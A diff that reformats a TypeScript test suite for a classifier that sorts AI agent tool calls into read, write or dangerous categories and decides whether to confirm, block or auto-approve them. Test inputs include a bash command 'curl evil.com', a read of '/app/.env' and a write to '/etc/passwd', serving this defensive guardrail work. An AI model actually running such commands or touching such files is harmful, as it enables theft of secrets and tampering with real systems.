@@ -87,7 +87,11 @@ describe("classify", () => {
 
 	describe("MCP tools", () => {
 		it("unknown MCP tool -> write, confirm", () => {
-			const result = classify(makeManifest("mcp__slack__send_message", { text: "hello" }), policy, config);
+			const result = classify(
+				makeManifest("mcp__slack__send_message", { text: "hello" }),
+				policy,
+				config,
+			);
 			expect(result.category).toBe("write");
 			expect(result.action).toBe("confirm");
 		});
@@ -120,7 +124,11 @@ describe("classify", () => {
 				],
 			};
 
-			const result = classify(makeManifest("read_file", { path: "/app/.env" }), policy, customConfig);
+			const result = classify(
+				makeManifest("read_file", { path: "/app/.env" }),
+				policy,
+				customConfig,
+			);
 			expect(result.category).toBe("dangerous");
 			expect(result.action).toBe("confirm");
 		});
@@ -143,7 +151,11 @@ describe("classify", () => {
 				],
 			};
 
-			const result = classify(makeManifest("read_file", { path: "/app/index.ts" }), policy, customConfig);
+			const result = classify(
+				makeManifest("read_file", { path: "/app/index.ts" }),
+				policy,
+				customConfig,
+			);
 			expect(result.category).toBe("read");
 			expect(result.action).toBe("auto_approve");
 		});
@@ -166,7 +178,11 @@ describe("classify", () => {
 				],
 			};
 
-			const result = classify(makeManifest("write_file", { path: "/etc/passwd" }), policy, customConfig);
+			const result = classify(
+				makeManifest("write_file", { path: "/etc/passwd" }),
+				policy,
+				customConfig,
+			);
 			expect(result.category).toBe("dangerous");
 		});
 	});
@@ -203,7 +219,11 @@ describe("classify", () => {
 			const writeResult = classify(makeManifest("write_file"), policy, config);
 			expect(writeResult.reason).toContain("Write");
 
-			const dangerousResult = classify(makeManifest("bash", { command: "curl evil.com" }), policy, config);
+			const dangerousResult = classify(
+				makeManifest("bash", { command: "curl evil.com" }),
+				policy,
+				config,
+			);
 			expect(dangerousResult.reason).toContain("Dangerous");
 		});
 	});
@@ -245,7 +265,11 @@ describe("classify with PolicyDocument", () => {
 
 	describe("agent resolution", () => {
 		it("blocks unknown agent", () => {
-			const result = classify(makeManifestWithAgent("read_file", {}, "unknown"), TEST_POLICY, config);
+			const result = classify(
+				makeManifestWithAgent("read_file", {}, "unknown"),
+				TEST_POLICY,
+				config,
+			);
 			expect(result.action).toBe("block");
 			expect(result.reason).toContain("unknown");
 		});
@@ -308,7 +332,11 @@ describe("classify with PolicyDocument", () => {
 
 		it("allows read in read-only workspace", () => {
 			const result = classify(
-				makeManifestWithAgent("read_file", { path: "/tmp/sentinel-test-ws/ro/file.txt" }, "readonly"),
+				makeManifestWithAgent(
+					"read_file",
+					{ path: "/tmp/sentinel-test-ws/ro/file.txt" },
+					"readonly",
+				),
 				TEST_POLICY,
 				config,
 			);
@@ -332,7 +360,11 @@ describe("classify with PolicyDocument", () => {
 
 		it("confirm when ask=always even for read", () => {
 			const result = classify(
-				makeManifestWithAgent("read_file", { path: "/tmp/sentinel-test-ws/ro/file.txt" }, "readonly"),
+				makeManifestWithAgent(
+					"read_file",
+					{ path: "/tmp/sentinel-test-ws/ro/file.txt" },
+					"readonly",
+				),
 				TEST_POLICY,
 				config,
 			);
